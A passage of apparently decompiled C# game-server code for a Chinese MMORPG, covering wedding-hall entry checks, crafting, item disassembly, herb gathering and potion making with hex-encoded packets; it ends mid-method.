				base.Client.Send多包(array, array.Length);
			}
		}

		public void 情侣请求(int id, string 本人名字, string 对方名字)
		{
			byte[] array = Converter.hexStringToByte("AA553E003F027917300001000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFF0000000000000000000029B955AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			byte[] bytes = Encoding.Default.GetBytes(本人名字);
			byte[] bytes2 = Encoding.Default.GetBytes(对方名字);
			Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
			Buffer.BlockCopy(bytes2, 0, array, 33, bytes2.Length);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public bool 检测仪式申请条件(int 地图, int 入场券)
		{
			if (地图 == 0)
			{
				情侣提示(40, base.UserName, base.FLD_情侣);
				系统提示("只有本场婚礼新郎官才能申请进行婚礼仪式。");
				return false;
			}
			if (base.FLD_情侣.Length == 0)
			{
				情侣提示(16, "", "");
				return false;
			}
			if (base.FLD_情侣.Length == 0)
			{
				情侣提示(16, "", "");
				return false;
			}
			if (解除关系倒计时 != 0)
			{
				情侣提示(53, base.UserName, base.FLD_情侣);
				return false;
			}
			if (是否已婚 == 1)
			{
				情侣提示(16, base.UserName, base.FLD_情侣);
				return false;
			}
			Players players = 得到人物数据(base.FLD_情侣);
			if (players == null)
			{
				情侣提示(18, base.UserName, base.FLD_情侣);
				return false;
			}
			if (players.人物坐标_地图 != 地图)
			{
				情侣提示(64, base.UserName, base.FLD_情侣);
				return false;
			}
			if (入场券 == 1000000333)
			{
				if (BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0) != 16900090)
				{
					情侣提示(30, base.UserName, base.FLD_情侣);
					情侣提示(0, base.UserName, base.FLD_情侣);
					return false;
				}
				if (BitConverter.ToInt32(players.装备栏已穿装备[11].物品ID, 0) != 26900078)
				{
					players.情侣提示(30, players.UserName, players.FLD_情侣);
					players.情侣提示(0, players.UserName, players.FLD_情侣);
					return false;
				}
			}
			if (入场券 == 1000000334)
			{
				if (BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0) != 16900298)
				{
					情侣提示(30, base.UserName, base.FLD_情侣);
					情侣提示(0, base.UserName, base.FLD_情侣);
					return false;
				}
				if (BitConverter.ToInt32(players.装备栏已穿装备[11].物品ID, 0) != 26900283)
				{
					players.情侣提示(30, players.UserName, players.FLD_情侣);
					players.情侣提示(0, players.UserName, players.FLD_情侣);
					return false;
				}
			}
			if (入场券 == 1000000335)
			{
				if (BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0) != 16900300)
				{
					情侣提示(30, base.UserName, base.FLD_情侣);
					情侣提示(0, base.UserName, base.FLD_情侣);
					return false;
				}
				if (BitConverter.ToInt32(players.装备栏已穿装备[11].物品ID, 0) != 26900284)
				{
					players.情侣提示(30, players.UserName, players.FLD_情侣);
					players.情侣提示(0, players.UserName, players.FLD_情侣);
					return false;
				}
			}
			if (得到包裹空位数() < 3)
			{
				情侣提示(50, players.UserName, players.FLD_情侣);
				return false;
			}
			if (players.得到包裹空位数() < 3)
			{
				系统提示("新娘背包没有空位了，清理后再申请。");
				players.情侣提示(50, players.UserName, players.FLD_情侣);
				return false;
			}
			if (得到包裹物品(1000000416) == null)
			{
				情侣提示(45, base.UserName, base.FLD_情侣);
				return false;
			}
			if (players.得到包裹物品(1000000416) != null)
			{
				return true;
			}
			系统提示("新娘必须携带情侣戒指才能进行婚礼仪式。");
			players.情侣提示(45, players.UserName, players.FLD_情侣);
			return false;
		}

		public bool 检测婚宴厅进入条件(int 地图, int 入场券)
		{
			if (base.Player_Sex == 2)
			{
				情侣提示(40, "", "");
				系统提示("租用婚宴厅只能由准新郎官发起申请。");
				return false;
			}
			if (base.FLD_情侣.Length == 0)
			{
				情侣提示(16, "", "");
				return false;
			}
			if (解除关系倒计时 != 0)
			{
				情侣提示(53, base.UserName, base.FLD_情侣);
				return false;
			}
			if (是否已婚 == 1)
			{
				情侣提示(16, base.UserName, base.FLD_情侣);
				return false;
			}
			Players players = 得到人物数据(base.FLD_情侣);
			if (players == null)
			{
				情侣提示(18, base.UserName, base.FLD_情侣);
				return false;
			}
			if (得到包裹物品(1000000416) == null)
			{
				情侣提示(45, base.UserName, base.FLD_情侣);
				return false;
			}
			if (players.得到包裹物品(1000000416) == null)
			{
				情侣提示(45, base.UserName, base.FLD_情侣);
				players.情侣提示(45, base.UserName, players.FLD_情侣);
				return false;
			}
			if (得到包裹物品(入场券) == null)
			{
				情侣提示(52, base.UserName, base.FLD_情侣);
				return false;
			}
			if (FLD_爱情度等级 > 4)
			{
				情侣提示(72, base.UserName, base.FLD_情侣);
				return false;
			}
			if (入场券 == 1000000333 && World.龙赡殿是否在使用中)
			{
				情侣提示(49, base.UserName, base.FLD_情侣);
				return false;
			}
			if (入场券 == 1000000334 && World.华婚殿是否在使用中)
			{
				情侣提示(49, base.UserName, base.FLD_情侣);
				return false;
			}
			if (入场券 == 1000000335 && World.圣礼殿是否在使用中)
			{
				情侣提示(49, base.UserName, base.FLD_情侣);
				return false;
			}
			if (入场券 == 1000000333)
			{
				if (BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0) != 16900090)
				{
					情侣提示(48, base.UserName, base.FLD_情侣);
					情侣提示(0, base.UserName, base.FLD_情侣);
					return false;
				}
				if (BitConverter.ToInt32(players.装备栏已穿装备[11].物品ID, 0) != 26900078)
				{
					players.情侣提示(48, players.UserName, players.FLD_情侣);
					players.情侣提示(0, players.UserName, players.FLD_情侣);
					return false;
				}
			}
			if (入场券 == 1000000334)
			{
				if (BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0) != 16900298)
				{
					情侣提示(48, base.UserName, base.FLD_情侣);
					情侣提示(0, base.UserName, base.FLD_情侣);
					return false;
				}
				if (BitConverter.ToInt32(players.装备栏已穿装备[11].物品ID, 0) != 26900283)
				{
					players.情侣提示(48, players.UserName, players.FLD_情侣);
					players.情侣提示(0, players.UserName, players.FLD_情侣);
					return false;
				}
			}
			if (入场券 == 1000000335)
			{
				if (BitConverter.ToInt32(装备栏已穿装备[11].物品ID, 0) != 16900300)
				{
					情侣提示(48, base.UserName, base.FLD_情侣);
					情侣提示(0, base.UserName, base.FLD_情侣);
					return false;
				}
				if (BitConverter.ToInt32(players.装备栏已穿装备[11].物品ID, 0) != 26900284)
				{
					players.情侣提示(48, players.UserName, players.FLD_情侣);
					players.情侣提示(0, players.UserName, players.FLD_情侣);
					系统提示("新娘 " + players.UserName + " 必须穿着婚礼服才能进场。");
					return false;
				}
			}
			return true;
		}

		public void 预备时间结束事件(object source, ElapsedEventArgs e)
		{
			try
			{
				if ((int)预备时间.Subtract(DateTime.Now).TotalSeconds > 0)
				{
					return;
				}
				if (婚礼地图 == 9101)
				{
					if (!World.龙赡殿是否在使用中)
					{
						foreach (Players value in World.AllConnectedPlayers.Values)
						{
							int num = RNG.Next(1, 30);
							if (value.人物坐标_地图 == 婚礼地图)
							{
								int num2 = RNG.Next(1, 30);
								if (World.老泫勃派开关 == 1)
								{
									value.移动(495f, 1727f, 15f, 29000);
								}
								else
								{
									value.移动(num, num2, 15f, 101);
								}
							}
						}
					}
				}
				else if (婚礼地图 == 9001)
				{
					if (!World.华婚殿是否在使用中)
					{
						foreach (Players value2 in World.AllConnectedPlayers.Values)
						{
							int num3 = RNG.Next(1, 30);
							if (value2.人物坐标_地图 == 婚礼地图)
							{
								int num4 = RNG.Next(1, 30);
								if (World.老泫勃派开关 == 1)
								{
									value2.移动(495f, 1727f, 15f, 29000);
								}
								else
								{
									value2.移动(num3, num4, 15f, 101);
								}
							}
						}
					}
				}
				else if (婚礼地图 == 9201 && !World.圣礼殿是否在使用中)
				{
					foreach (Players value3 in World.AllConnectedPlayers.Values)
					{
						int num5 = RNG.Next(1, 30);
						if (value3.人物坐标_地图 == 婚礼地图)
						{
							int num6 = RNG.Next(1, 30);
							if (World.老泫勃派开关 == 1)
							{
								value3.移动(495f, 1727f, 15f, 29000);
							}
							else
							{
								value3.移动(num5, num6, 15f, 101);
							}
						}
					}
				}
				if (预备申请仪式计时器 != null)
				{
					预备申请仪式计时器.Enabled = false;
					预备申请仪式计时器.Close();
					预备申请仪式计时器.Dispose();
				}
			}
			catch
			{
			}
		}

		public void 长白丹(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte[] array = new byte[4];
				Buffer.BlockCopy(封包数据, 18, array, 0, 2);
				if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0) != 1008000009 && BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array, 0)].物品ID, 0) != 1008000010)
				{
					return;
				}
				减去物品(BitConverter.ToInt32(array, 0), 1);
				int num = 0;
				for (int i = 0; i < 12; i++)
				{
					if (封包数据[18 + i * 4] == 0)
					{
						continue;
					}
					for (int j = 0; j < 12; j++)
					{
						if (气功[j].气功ID == 封包数据[18 + i * 4])
						{
							int num2 = 封包数据[20 + i * 4];
							num += 封包数据[20 + i * 4];
							if (气功[i].气功量 >= num2)
							{
								气功[i].气功量 -= num2;
								break;
							}
							系统提示("所分配点数与实际气功点数不一致, 请重新分配。", 50, "系统提示");
							return;
						}
					}
				}
				base.Player_Qigong_point += num;
				byte[] array2 = Converter.hexStringToByte("AA551F002C01021011000000050000000000000000000000000000000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send多包(array2, array2.Length);
				}
				更新气功();
				更新武功和状态();
				更新HP_MP_SP();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "长白丹 出错：" + ex);
			}
		}

		public void 删除制作技术(byte[] 封包数据, int 封包大小)
		{
			int jlMsg = World.JlMsg;
			if (base.FLD_制作类型 == 0)
			{
				删除制作技能提示(-9);
				return;
			}
			if (base.Player_Money < 30000000)
			{
				删除制作技能提示(-8);
				return;
			}
			base.Player_Money -= 30000000L;
			base.FLD_制作类型 = 0;
			base.FLD_制作熟练度 = 0;
			byte[] array = Converter.hexStringToByte("AA550E001400431708000100000080C3C90155AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			计算人物制作等级();
			更新经验和历练();
			更新制作系统();
			更新金钱和负重();
		}

		public void 删除制作技能提示(int ID)
		{
			byte[] array = Converter.hexStringToByte("AA550E00140043170800F7FFFFFF0000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 10, 4);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 制作系统动作(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[4];
			Buffer.BlockCopy(封包数据, 10, array, 0, 2);
			byte[] array2 = Converter.hexStringToByte("AA551200FA0341170400FA030200000000000000000055AA");
			Buffer.BlockCopy(array, 0, array2, 12, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 10, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array2, array2.Length);
			}
			发送当前范围广播数据多包(array2, array2.Length);
		}

		public void 制作分解检查(byte[] data, int length)
		{
		}

		public void 制作分解系统(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			byte[] array = new byte[4];
			byte[] array2 = new byte[4];
			Buffer.BlockCopy(封包数据, 18, array, 0, 4);
			Buffer.BlockCopy(封包数据, 26, array2, 0, 4);
			if (装备栏包裹[BitConverter.ToInt32(array2, 0)].物品绑定)
			{
				分解物品提示(-1);
				return;
			}
			if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array2, 0)].物品ID, 0) != BitConverter.ToInt32(array, 0))
			{
				分解物品提示(-1);
				return;
			}
			int num = 得到包裹空位(this);
			if (num == -1)
			{
				分解物品提示(-1);
				return;
			}
			switch (base.FLD_制作类型)
			{
			case 1:
			{
				if (World.Itme.TryGetValue(BitConverter.ToInt32(array, 0), out var value3) && value3.FLD_RESIDE2 == 4)
				{
					switch (value3.FLD_JOB_LEVEL)
					{
					case 2:
					{
						int value7 = RNG.Next(7, 9);
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000721), num, BitConverter.GetBytes(value7), new byte[56]);
						break;
					}
					case 3:
					{
						int value6 = RNG.Next(19, 21);
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000722), num, BitConverter.GetBytes(value6), new byte[56]);
						break;
					}
					case 4:
					{
						int value5 = RNG.Next(7, 11);
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000723), num, BitConverter.GetBytes(value5), new byte[56]);
						break;
					}
					case 5:
					{
						int value4 = RNG.Next(7, 11);
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000724), num, BitConverter.GetBytes(value4), new byte[56]);
						break;
					}
					}
				}
				break;
			}
			case 2:
			{
				int value = RNG.Next(7, 9);
				if (World.Itme.TryGetValue(BitConverter.ToInt32(array, 0), out var value2))
				{
					if (value2.FLD_LEVEL >= 100)
					{
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000736), num, BitConverter.GetBytes(value), new byte[56]);
					}
					else if (value2.FLD_LEVEL >= 80 && value2.FLD_LEVEL < 99)
					{
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000735), num, BitConverter.GetBytes(value), new byte[56]);
					}
					else if (value2.FLD_LEVEL >= 60 && value2.FLD_LEVEL < 79)
					{
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000734), num, BitConverter.GetBytes(value), new byte[56]);
					}
					else if (value2.FLD_LEVEL >= 40 && value2.FLD_LEVEL < 59)
					{
						减去物品(BitConverter.ToInt32(array2, 0), 1);
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000733), num, BitConverter.GetBytes(value), new byte[56]);
					}
				}
				break;
			}
			case 3:
				switch (BitConverter.ToInt32(array, 0))
				{
				case 800000002:
					减去物品(BitConverter.ToInt32(array2, 0), 1);
					增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000746), num, BitConverter.GetBytes(1), new byte[56]);
					break;
				case 800000001:
					减去物品(BitConverter.ToInt32(array2, 0), 1);
					增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000745), num, BitConverter.GetBytes(1), new byte[56]);
					break;
				case 800000028:
					减去物品(BitConverter.ToInt32(array2, 0), 1);
					增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000749), num, BitConverter.GetBytes(1), new byte[56]);
					break;
				case 800000024:
					减去物品(BitConverter.ToInt32(array2, 0), 1);
					增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000748), num, BitConverter.GetBytes(1), new byte[56]);
					break;
				case 800000023:
					减去物品(BitConverter.ToInt32(array2, 0), 1);
					增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000747), num, BitConverter.GetBytes(1), new byte[56]);
					break;
				}
				break;
			}
			byte[] array3 = Converter.hexStringToByte("AA55120054003117040001000000000000000000477B55AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array3, array3.Length);
			}
		}

		public void 制作系统检查(byte[] 封包数据, int length)
		{
			封包修改(封包数据, length);
			int key = BitConverter.ToInt32(封包数据, 10);
			CraftingItem value;
			if (得到包裹空位(this) == -1)
			{
				分解物品提示(-1);
			}
			else if (World.craftingItemsList.TryGetValue(key, out value))
			{
				if ((base.FLD_制作类型 == value.CraftType || value.CraftType == 4) && base.FLD_制作等级 >= value.CraftLevel)
				{
					if (value.RequiredItems.Count > 0)
					{
						foreach (RequiredItem item in value.RequiredItems)
						{
							物品类 物品类2 = 得到包裹物品(item.Id);
							if (物品类2 == null || BitConverter.ToInt32(物品类2.物品数量, 0) < item.Number)
							{
								分解物品提示(-3);
								break;
							}
						}
					}
					else
					{
						分解物品提示(-3);
						MainForm.WriteLine(1, "制作物品列表 错误" + value.ItemName);
					}
				}
				else
				{
					分解物品提示(-1);
				}
			}
			else
			{
				分解物品提示(-1);
			}
		}

		public void 制作物品New(CraftingItem 物品, int 空位)
		{
			byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
			byte[] array = new byte[56];
			int num = new Random(DateTime.Now.Millisecond).Next(0, 1501 - base.FLD_制作熟练度);
			int value = 0;
			if (num < World.制作进化二概率)
			{
				value = 2;
			}
			else if (num < World.制作进化一概率)
			{
				value = 1;
			}
			Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 52, 2);
			增加物品2(bytes, BitConverter.GetBytes(物品.ItemID), 空位, BitConverter.GetBytes(1), array);
			MainForm.WriteLine(5, "制作物品 [" + base.Userid + "] [" + base.UserName + "] 物品名[" + 物品.ItemName + "] 全局ID=[" + BitConverter.ToInt32(bytes, 0) + "] LV[" + value + "]");
		}

		public void 制作系统制作(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			int key = BitConverter.ToInt32(封包数据, 10);
			int num = 得到包裹空位(this);
			if (num == -1)
			{
				分解物品提示(-1);
				return;
			}
			if (World.craftingItemsList.TryGetValue(key, out var value))
			{
				if ((base.FLD_制作类型 == value.CraftType || value.CraftType == 4) && base.FLD_制作等级 >= value.CraftLevel)
				{
					if (value.RequiredItems.Count <= 0)
					{
						分解物品提示(-3);
						MainForm.WriteLine(1, "制作物品列表 错误" + value.ItemName);
						return;
					}
					foreach (RequiredItem item in value.RequiredItems)
					{
						物品类 物品类2 = 得到包裹物品(item.Id);
						if (物品类2 == null || BitConverter.ToInt32(物品类2.物品数量, 0) < item.Number)
						{
							分解物品提示(-3);
							return;
						}
					}
					foreach (RequiredItem item2 in value.RequiredItems)
					{
						for (int i = 0; i < 96; i++)
						{
							if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == item2.Id)
							{
								减去物品(i, item2.Number);
								break;
							}
						}
					}
					switch (base.FLD_制作类型)
					{
					case 1:
					{
						if (!World.Itme.TryGetValue(value.ItemID, out var value2))
						{
							break;
						}
						if (value2.FLD_RESIDE2 != 0)
						{
							制作物品New(value, num);
							if (base.FLD_制作等级 <= value.CraftLevel)
							{
								base.FLD_制作熟练度++;
								更新经验和历练();
								计算人物制作等级();
							}
						}
						else
						{
							增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value.ItemID), num, BitConverter.GetBytes(value.ItemQuantity), new byte[56]);
						}
						break;
					}
					case 2:
					{
						if (!World.Itme.TryGetValue(value.ItemID, out var value3))
						{
							break;
						}
						if (value3.FLD_RESIDE2 != 0)
						{
							制作物品New(value, num);
							if (base.FLD_制作等级 <= value.CraftLevel)
							{
								base.FLD_制作熟练度++;
								更新经验和历练();
								计算人物制作等级();
							}
						}
						else
						{
							增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value.ItemID), num, BitConverter.GetBytes(value.ItemQuantity), new byte[56]);
						}
						break;
					}
					case 3:
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value.ItemID), num, BitConverter.GetBytes(value.ItemQuantity), new byte[56]);
						if (base.FLD_制作等级 <= value.CraftLevel)
						{
							base.FLD_制作熟练度++;
							更新经验和历练();
							计算人物制作等级();
						}
						break;
					}
				}
				else
				{
					分解物品提示(-2);
				}
			}
			else
			{
				分解物品提示(-2);
			}
			byte[] array = Converter.hexStringToByte("AA55120084023617040001000000000000000000D80855AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 学习制作技能(byte[] 封包数据, int 封包大小)
		{
			if (base.FLD_制作类型 == 0)
			{
				byte[] array = new byte[4];
				Buffer.BlockCopy(封包数据, 10, array, 0, 2);
				base.FLD_制作类型 = BitConverter.ToInt32(array, 0);
				base.FLD_制作熟练度 = 800;
				byte[] array2 = Converter.hexStringToByte("AA556600BF013917580002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000784A55AA");
				Buffer.BlockCopy(array, 0, array2, 11, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send多包(array2, array2.Length);
				}
				计算人物制作等级();
				更新经验和历练();
				更新制作系统();
			}
		}

		public void 潜行(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[4];
			Buffer.BlockCopy(封包数据, 14, array, 0, 4);
			int value = BitConverter.ToInt32(array, 0);
			int value2 = BitConverter.ToInt16(封包数据, 18);
			byte[] array2 = Converter.hexStringToByte("AA552600E2015117180001000000B2390C002C01000001000000000000009F000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array2, 14, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array2, 18, 2);
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
			发送当前范围广播数据(array2, array2.Length);
		}

		public void 制药系统(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			int key = BitConverter.ToInt32(封包数据, 14);
			int num = 得到包裹空位(this);
			if (num == -1)
			{
				return;
			}
			int num2 = BitConverter.ToInt32(封包数据, 22);
			if (num2 > 99)
			{
				MainForm.WriteLine(9, "制药超过数量99[" + base.Userid + "]-[" + base.UserName + "]");
				系统提示("制药药品最大数量99超过无法使用.....");
				return;
			}
			int num3 = 0;
			Random random = new Random();
			if (!World.制药物品列表.TryGetValue(key, out var value))
			{
				return;
			}
			foreach (制药需要物品类 item in value.需要物品)
			{
				for (int i = 0; i < 装备栏包裹.Length; i++)
				{
					if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == item.Id && BitConverter.ToInt32(装备栏包裹[i].物品数量, 0) >= item.number)
					{
						减去物品(i, item.number * num2);
						break;
					}
				}
			}
			for (int j = 0; j < num2; j++)
			{
				int num4 = 80;
				if ((double)random.Next(0, 110) <= (double)num4 + base.医_神农仙术)
				{
					增加物品4(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value.物品ID), num, BitConverter.GetBytes(1), new byte[56]);
				}
				else
				{
					num3++;
				}
			}
			int value2 = num2 - num3;
			byte[] array = Converter.hexStringToByte("AA55160088041B1710000B00010045CD9A3B000000000100000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(num), 0, array, 10, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(value.物品ID), 0, array, 14, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array, 22, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 采药(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[4];
			Buffer.BlockCopy(封包数据, 14, array, 0, 4);
			if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(BitConverter.ToInt32(array, 0), out var value))
			{
				value.NPC死亡 = false;
				value.发送采药数据();
				value.发送死亡数据(base.人物全服ID);
				int fLD_PID = value.FLD_PID;
				int num = 得到包裹空位(this);
				byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
				switch (fLD_PID)
				{
				case 15269:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000795), 装备栏包裹[num].物品属性);
					break;
				case 15270:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000796), 装备栏包裹[num].物品属性);
					break;
				case 15271:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000797), 装备栏包裹[num].物品属性);
					break;
				case 15278:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000798), 装备栏包裹[num].物品属性);
					break;
				case 15279:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000799), 装备栏包裹[num].物品属性);
					break;
				case 15280:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000800), 装备栏包裹[num].物品属性);
					break;
				case 15281:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000801), 装备栏包裹[num].物品属性);
					break;
				case 15282:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000802), 装备栏包裹[num].物品属性);
					break;
				case 15283:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000803), 装备栏包裹[num].物品属性);
					break;
				case 15284:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000804), 装备栏包裹[num].物品属性);
					break;
				case 15285:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000807), 装备栏包裹[num].物品属性);
					break;
				case 15286:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000808), 装备栏包裹[num].物品属性);
					break;
				case 15287:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000809), 装备栏包裹[num].物品属性);
					break;
				case 15288:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000810), 装备栏包裹[num].物品属性);
					break;
				case 15289:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000811), 装备栏包裹[num].物品属性);
					break;
				case 15290:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000812), 装备栏包裹[num].物品属性);
					break;
				case 15291:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000813), 装备栏包裹[num].物品属性);
					break;
				case 15292:
					采到物品(num, BitConverter.GetBytes(1), bytes, BitConverter.GetBytes(1000000814), 装备栏包裹[num].物品属性);
					break;
				case 15272:
				case 15273:
				case 15274:
				case 15275:
				case 15276:
				case 15277:
					break;
				}
			}
		}

		public void 采到物品(int 位置, byte[] 数量, byte[] 物品全局ID, byte[] 物品ID, byte[] 物品属性)
		{
			try
			{
				if (!World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out var value))
				{
					return;
				}
				byte[] array = Converter.hexStringToByte("AA55720094020D006400010000008716E567818320060208AF2F000000000100000000000000010F020F00020000470D0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000C3E755AA");
				byte[] array2 = new byte[World.数据库单个物品大小];
				if (value.FLD_SIDE != 0)
				{
					byte[] array3 = new byte[4];
					Buffer.BlockCopy(物品属性, 0, array3, 0, 4);
					物品类 物品类2 = 得到人物物品类型(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(array3, 0));
					if (BitConverter.ToInt32(物品ID, 0) == 1008000044 || BitConverter.ToInt32(物品ID, 0) == 1008000045)
					{
						物品全局ID = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
						数量 = BitConverter.GetBytes(BitConverter.ToInt32(数量, 0));
					}
					else if (物品类2 != null)
					{
						位置 = 物品类2.物品位置;
						物品全局ID = 物品类2.物品全局ID;
						数量 = BitConverter.GetBytes(BitConverter.ToInt32(物品类2.物品数量, 0) + BitConverter.ToInt32(数量, 0));
					}
				}
				else
				{
					数量 = BitConverter.GetBytes(1);
				}
				Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
				Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
				Buffer.BlockCopy(数量, 0, array2, 12, 4);
				Buffer.BlockCopy(物品属性, 0, array2, 16, 物品属性.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 40, 2);
				Buffer.BlockCopy(array2, 0, array, 14, 12);
				Buffer.BlockCopy(array2, 12, array, 30, 4);
				Buffer.BlockCopy(array2, 16, array, 43, 物品属性.Length);
				装备栏包裹[位置].物品_byte = array2;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "采到物品出错 [" + base.Userid + "][" + base.UserName + "] 位置[" + 位置 + "] 数量[" + BitConverter.ToInt32(数量, 0) + "]" + ex.Message);
			}
		}

		public void 名字样式(byte[] 封包数据, int 封包大小)
		{
			try
			{
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				byte[] array3 = new byte[4];
				byte[] dst = new byte[4];
